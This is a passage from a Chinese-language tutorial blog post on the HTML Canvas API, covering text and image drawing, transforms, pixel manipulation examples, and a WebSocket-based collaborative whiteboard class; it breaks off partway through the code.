class="line">ctx.shadowBlur    = float   设定阴影的模糊程度</span><br><span class="line">ctx.shadowColor   = color   设定阴影颜色</span><br><span class="line">ctx.font = <span class="string">'123'</span>;</span><br><span class="line">ctx.fillStyle = <span class="string">'#000'</span>;</span><br><span class="line">ctx.fillText(<span class="string">'Sample String'</span>, <span class="number">5</span>, <span class="number">30</span>);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-文本和图片"><a href="#4-文本和图片" class="headerlink" title="4. 文本和图片"></a>4. 文本和图片</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctx.font = <span class="string">'10px sans-serif'</span>;</span><br><span class="line">ctx.textAlign = <span class="string">'start/end/left/right/center'</span>;</span><br><span class="line">ctx.textBaseline = <span class="string">'top/hanging/middle/alphabetic/ideographic/bottom'</span>;</span><br><span class="line">ctx.direction = <span class="string">'ltr/rtl/inherit'</span>;</span><br><span class="line"></span><br><span class="line">ctx.fillText(text, x, y, maxWdith)    在指定的(x,y)位置填充指定文本，绘制的最大宽度可选</span><br><span class="line">ctx.strokeText(text, x, y, maxWidth)  在指定的(x,y)位置绘制指定文本，绘制的最大宽度可选</span><br><span class="line"></span><br><span class="line"><span class="comment">// 预测量文本宽度</span></span><br><span class="line"><span class="keyword">var</span> text = ctx.measureText(<span class="string">'foo'</span>);</span><br><span class="line">text.width <span class="comment">// 16</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drawImage(image, x, y)                                              绘制图片</span><br><span class="line">drawImage(image, x, y, width, height)                               绘制图片(缩放)</span><br><span class="line">drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight3) 切片</span><br></pre></td></tr></table></figure><p><img src="/2018/10/06/Canvas文档/3.jpg" style="padding-top:20px; max-width: 380px"><br><br></p><h3 id="5-变形"><a href="#5-变形" class="headerlink" title="5. 变形"></a>5. 变形</h3><h4 id="5-1-状态的保存和恢复"><a href="#5-1-状态的保存和恢复" class="headerlink" title="5.1 状态的保存和恢复"></a>5.1 状态的保存和恢复</h4><p>Canvas状态存储在栈中，每当<code>save()</code>方法被调用后，当前的状态就被推送到栈中。你可以调用任意多次<code>save</code>方法，每一次调用<code>restore</code>方法，上一个保存的状态就从栈中弹出，所有设定都恢复。</p><p>一个绘画状态包括：①当前应用的变形(移动、旋转、缩放)；②strokeStyle, fillStyle, globalAlpha, lineWidth, lineCap, lineJoin, miterLimit, shadowOffsetX, shadowOffsetY, shadowBlur, shadowColor, globalCompositeOperation 的值； ③当前的裁切路径<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.save()    保存canvas状态</span><br><span class="line">ctx.restore() 恢复canvas状态</span><br></pre></td></tr></table></figure></p><h4 id="5-2-移动，旋转，变形，缩放"><a href="#5-2-移动，旋转，变形，缩放" class="headerlink" title="5.2 移动，旋转，变形，缩放"></a>5.2 移动，旋转，变形，缩放</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctx.translate(x, y)   [移动]移动canvas和它的原点到一个不同的位置</span><br><span class="line">ctx.rotate(angle)     [旋转]以原点为中心旋转canvas</span><br><span class="line">ctx.scale(x, y)       [缩放]对形状，位图进行缩小或者放大，x, y默认值为<span class="number">1</span></span><br><span class="line">ctx.transform(m11, m12, m21, m22, dx, dy) [变形]</span><br><span class="line">ctx.transform(水平方向的缩放，水平方向的倾斜偏移，竖直方向的缩放，竖直方向的倾斜偏移，水平方向的移动，竖直方向的移动)</span><br></pre></td></tr></table></figure><p><img src="/2018/10/06/Canvas文档/4.png" style="padding-top:20px; max-width: 380px"></p><p><br></p><h3 id="6-其它"><a href="#6-其它" class="headerlink" title="6. 其它"></a>6. 其它</h3><h4 id="6-1-动画"><a href="#6-1-动画" class="headerlink" title="6.1 动画"></a>6.1 动画</h4><p>保存canvas状态, 清空canvas, 重绘动画帧。<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API/Tutorial/Advanced_animations" target="_blank" rel="noopener">高级动画示例</a></p><h4 id="6-2-颜色选择器"><a href="#6-2-颜色选择器" class="headerlink" title="6.2 颜色选择器"></a>6.2 颜色选择器</h4><p>像素操作: <code>ctx.getImageData(left, top, width, height)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">'https://mdn.mozillademos.org/files/5397/rhino.jpg'</span>;</span><br><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">'canvas'</span>);</span><br><span class="line"><span class="keyword">var</span> ctx = canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">img.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ctx.drawImage(img, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  img.style.display = <span class="string">'none'</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> color = <span class="built_in">document</span>.getElementById(<span class="string">'color'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pick</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = event.layerX;</span><br><span class="line">  <span class="keyword">var</span> y = event.layerY;</span><br><span class="line">  <span class="keyword">var</span> pixel = ctx.getImageData(x, y, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">var</span> data = pixel.data;</span><br><span class="line">  <span class="keyword">var</span> rgba = <span class="string">'rgba('</span> + data[<span class="number">0</span>] + <span class="string">','</span> + data[<span class="number">1</span>] +</span><br><span class="line">             <span class="string">','</span> + data[<span class="number">2</span>] + <span class="string">','</span> + (data[<span class="number">3</span>] / <span class="number">255</span>) + <span class="string">')'</span>;</span><br><span class="line">  color.style.background =  rgba;</span><br><span class="line">  color.textContent = rgba;</span><br><span class="line">&#125;</span><br><span class="line">canvas.addEventListener(<span class="string">'mousemove'</span>, pick);</span><br></pre></td></tr></table></figure></p><h4 id="6-3-图片灰度和反相颜色"><a href="#6-3-图片灰度和反相颜色" class="headerlink" title="6.3 图片灰度和反相颜色"></a>6.3 图片灰度和反相颜色</h4><p>在场景中写入像素数据: <code>ctx.putImageData(myImageData, dx, dy)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">'https://mdn.mozillademos.org/files/5397/rhino.jpg'</span>;</span><br><span class="line">img.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  draw(<span class="keyword">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params">img</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">'canvas'</span>);</span><br><span class="line">  <span class="keyword">var</span> ctx = canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">  ctx.drawImage(img, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  img.style.display = <span class="string">'none'</span>;</span><br><span class="line">  <span class="keyword">var</span> imageData = ctx.getImageData(<span class="number">0</span>,<span class="number">0</span>,canvas.width, canvas.height);</span><br><span class="line">  <span class="keyword">var</span> data = imageData.data;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">var</span> invert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">4</span>) &#123;</span><br><span class="line">      data[i]     = <span class="number">225</span> - data[i];     <span class="comment">// red</span></span><br><span class="line">      data[i + <span class="number">1</span>] = <span class="number">225</span> - data[i + <span class="number">1</span>]; <span class="comment">// green</span></span><br><span class="line">      data[i + <span class="number">2</span>] = <span class="number">225</span> - data[i + <span class="number">2</span>]; <span class="comment">// blue</span></span><br><span class="line">    &#125;</span><br><span class="line">    ctx.putImageData(imageData, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> grayscale = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> avg = (data[i] + data[i +<span class="number">1</span>] + data[i +<span class="number">2</span>]) / <span class="number">3</span>;</span><br><span class="line">      data[i]     = avg; <span class="comment">// red</span></span><br><span class="line">      data[i + <span class="number">1</span>] = avg; <span class="comment">// green</span></span><br><span class="line">      data[i + <span class="number">2</span>] = avg; <span class="comment">// blue</span></span><br><span class="line">    &#125;</span><br><span class="line">    ctx.putImageData(imageData, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> invertbtn = <span class="built_in">document</span>.getElementById(<span class="string">'invertbtn'</span>);</span><br><span class="line">  invertbtn.addEventListener(<span class="string">'click'</span>, invert);</span><br><span class="line">  <span class="keyword">var</span> grayscalebtn = <span class="built_in">document</span>.getElementById(<span class="string">'grayscalebtn'</span>);</span><br><span class="line">  grayscalebtn.addEventListener(<span class="string">'click'</span>, grayscale);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="6-4-把canvas保存为图片"><a href="#6-4-把canvas保存为图片" class="headerlink" title="6.4 把canvas保存为图片"></a>6.4 把canvas保存为图片</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">canvas.toDataURL(<span class="string">'image/png'</span>, quality)        创建一个png图片,<span class="number">0</span><span class="number">-1</span>的品质量,<span class="number">1</span>最好</span><br><span class="line">canvas.toBlob(callback, type, encoderOptions) 创建一个画布中代表图片的Blob对象</span><br></pre></td></tr></table></figure><h4 id="6-5-websocket实现白板功能"><a href="#6-5-websocket实现白板功能" class="headerlink" title="6.5 websocket实现白板功能"></a>6.5 websocket实现白板功能</h4><ul><li>绘制线条，直线，椭圆，矩形(可选择画笔粗细，线条颜色，填充颜色)</li><li>写字，输入框中输入确定后显示在画布上</li><li>橡皮檫，清空画布</li><li>撤销，恢复功能(再执行最近一次操作)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">repaint</span>(<span class="params">ctx, strokes</span>) </span>&#123;</span><br><span class="line">  ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, ctx.canvas.width, ctx.canvas.height);</span><br><span class="line">  <span class="keyword">if</span> (strokes === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  strokes.map(<span class="function">(<span class="params">stroke</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; strokeColor, width, graphType &#125; = stroke;</span><br><span class="line">    ctx.strokeStyle = strokeColor;</span><br><span class="line">    ctx.lineWidth = width;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> startX = stroke.data[<span class="number">0</span>].x;</span><br><span class="line">    <span class="keyword">const</span> startY = stroke.data[<span class="number">0</span>].y;</span><br><span class="line">    <span class="keyword">const</span> &#123; x, y &#125; = stroke.data[stroke.data.length - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    <span class="keyword">if</span> (graphType === <span class="string">'pencil'</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; stroke.data.length; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> prev = stroke.data[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">const</span> current = stroke.data[i];</span><br><span class="line">        <span class="keyword">if</span> (prev !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">          ctx.moveTo(prev.x, prev.y);</span><br><span class="line">        &#125;</span><br><span class="line">        ctx.lineTo(current.x, current.y);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'line'</span>) &#123;</span><br><span class="line">      ctx.moveTo(startX, startY);</span><br><span class="line">      ctx.lineTo(x, y);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'circle'</span>) &#123;</span><br><span class="line">      <span class="comment">// const radii = Math.sqrt((startX - x) * (startX - x) + (startY - y) * (startY - y));</span></span><br><span class="line">      <span class="comment">// ctx.arc(startX, startY, radii, 0, Math.PI * 2, false);</span></span><br><span class="line">      <span class="comment">// 椭圆</span></span><br><span class="line">      ctx.save();</span><br><span class="line">      <span class="keyword">const</span> o1 = (startX + x) / <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">const</span> o2 = (startY + y) / <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">const</span> a = <span class="built_in">Math</span>.abs((x - startX) / <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">const</span> b = <span class="built_in">Math</span>.abs((y - startY) / <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">const</span> r = (a &gt; b) ? a : b;</span><br><span class="line">      <span class="keyword">const</span> ratioX = a / r;</span><br><span class="line">      <span class="keyword">const</span> ratioY = b / r;</span><br><span class="line">      ctx.scale(ratioX, ratioY);</span><br><span class="line">      ctx.arc(o1 / ratioX, o2 / ratioY, r, <span class="number">0</span>, <span class="number">2</span> * <span class="built_in">Math</span>.PI, <span class="literal">false</span>);</span><br><span class="line">      ctx.restore();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'square'</span>) &#123;</span><br><span class="line">      ctx.moveTo(startX, startY);</span><br><span class="line">      ctx.lineTo(x, startY);</span><br><span class="line">      ctx.lineTo(x, y);</span><br><span class="line">      ctx.lineTo(startX, y);</span><br><span class="line">      ctx.lineTo(startX, startY);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'rubber'</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; stroke.data.length; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; x, y &#125; = stroke.data[i];</span><br><span class="line">        <span class="comment">// 操作清除像素</span></span><br><span class="line">        <span class="keyword">const</span> size = <span class="number">2</span>;</span><br><span class="line">        ctx.strokeStyle = <span class="string">'#000000'</span>;</span><br><span class="line">        ctx.clearRect(x - size * <span class="number">10</span> ,  y - size * <span class="number">10</span> , size * <span class="number">20</span> , size * <span class="number">20</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'text'</span>) &#123;</span><br><span class="line">      ctx.font = <span class="string">"16px Microsoft YaHei"</span>;</span><br><span class="line">      ctx.fillStyle = strokeColor;</span><br><span class="line">      ctx.fillText(stroke.text, startX, startY);</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.stroke();</span><br><span class="line">    ctx.closePath();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">WhiteBoard</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(options) &#123;</span><br><span class="line">    <span class="keyword">this</span>.canvas = <span class="built_in">document</span>.getElementById(<span class="string">'canvas'</span>);</span><br><span class="line">    <span class="keyword">this</span>.ctx = <span class="keyword">this</span>.canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">    <span class="keyword">this</span>.isDrawing = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.strokeColor = <span class="string">'#000'</span>;</span><br><span class="line">    <span class="keyword">this</span>.lineWidth = <span class="number">2</span>; <span class="comment">// 线的宽度</span></span><br><span class="line">    <span class="keyword">this</span>.graphType = <span class="string">'pencil'</span>;</span><br><span class="line">    <span class="keyword">this</span>.strokes = [];</span><br><span class="line">    <span class="keyword">this</span>.redo = [];</span><br><span class="line">    <span class="keyword">this</span>.textSite = &#123;&#125;;</span><br><span class="line">    <span class="keyword">const</span> &#123; wid, token &#125; = options;</span><br><span class="line">    <span class="keyword">const</span> ws = <span class="string">`ws://live.ngrok.elitemc.cn:8000/ws/whiteboard-<span class="subst">$&#123;wid&#125;</span>?token=<span class="subst">$&#123;token&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">this</span>.socket = <span class="keyword">new</span> WebSocket(ws);</span><br><span class="line">    <span class="keyword">this</span>.init();</span><br><span class="line">  &#125;</span><br><span class="line">  init = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; canvas, ctx &#125; = <span class="keyword">this</span>;</span><br><span class="line">    canvas.onmousedown = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.isDrawing = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">const</span> x = event.clientX - canvas.getBoundingClientRect().x;</span><br><span class="line">      <span class="keyword">const</span> y = event.clientY - canvas.getBoundingClientRect().y;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 在该坐标上设置文本框</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'text'</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.showTextBox(x, y);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.addPoint(x, y, <span class="literal">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果是橡皮檫，清空画布，重绘，显示橡皮檫</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'rubber'</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.showRubber(x, y);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    canvas.onmousemove = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> x = event.clientX - canvas.getBoundingClientRect().x;</span><br><span class="line">      <span class="keyword">const</span> y = event.clientY - canvas.getBoundingClientRect().y;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'text'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 记录操作,并重绘</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.isDrawing) &#123;</span><br><span class="line">        <span class="keyword">this</span>.addPoint(x, y);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果是橡皮檫，清空画布，重绘，显示橡皮檫</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'rubber'</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.showRubber(x, y);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    canvas.onmouseup = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.isDrawing = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'text'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.sendStrokes();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    canvas.onmouseleave = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.isDrawing = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'rubber'</span>) &#123;</span><br><span class="line">        <span class="comment">// 隐藏橡皮檫</span></span><br><span class="line">        <span class="keyword">this</span>.ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line">        <span class="keyword">this</span>.repaint();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  showTextBox = <span class="function">(<span class="params">x, y</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> textElem = <span class="built_in">document</span>.getElementById(<span class="string">'text'</span>);</span><br><span class="line">    textElem.style.display = <span class="string">'block'</span>;</span><br><span class="line">    textElem.style.top = y + <span class="string">'px'</span>;</span><br><span class="line">    textElem.style.left = x + <span class="string">'px'</span>;</span><br><span class="line">    <span class="keyword">this</span>.textSite = &#123; x, y &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  showRubber = <span class="function">(<span class="params">x, y</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 如果是橡皮檫，清空画布，重绘，显示橡皮檫</span></span><br><span class="line">    <span class="keyword">const</span> &#123; ctx &#125; = <span class="keyword">this</span>;</span><br><span class="line">    ctx.lineWidth = <span class="number">1</span>;</span><br><span class="line">    ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line">    <span class="keyword">this</span>.repaint();</span><br><span class="line"></span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.strokeStyle = <span class="string">'#000000'</span>;</span><br><span class="line">    <span class="keyword">const</span> size = <span class="number">2</span>;</span><br><span class="line">    ctx.moveTo(x - size * <span class="number">10</span> , y - size * <span class="number">10</span> );</span><br><span class="line">    ctx.lineTo(x + size * <span class="number">10</span> , y - size * <span class="number">10</span> );</span><br><span class="line">    ctx.lineTo(x + size * <span class="number">10</span> , y + size * <span class="number">10</span> );</span><br><span class="line">    ctx.lineTo(x - size * <span class="number">10</span> , y + size * <span class="number">10</span> );</span><br><span class="line">    ctx.lineTo(x - size * <span class="number">10</span> , y - size * <span class="number">10</span> );</span><br><span class="line">    ctx.stroke();</span><br><span class="line">  &#125;</span><br><span class="line">  sendStrokes = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.socket.send(<span 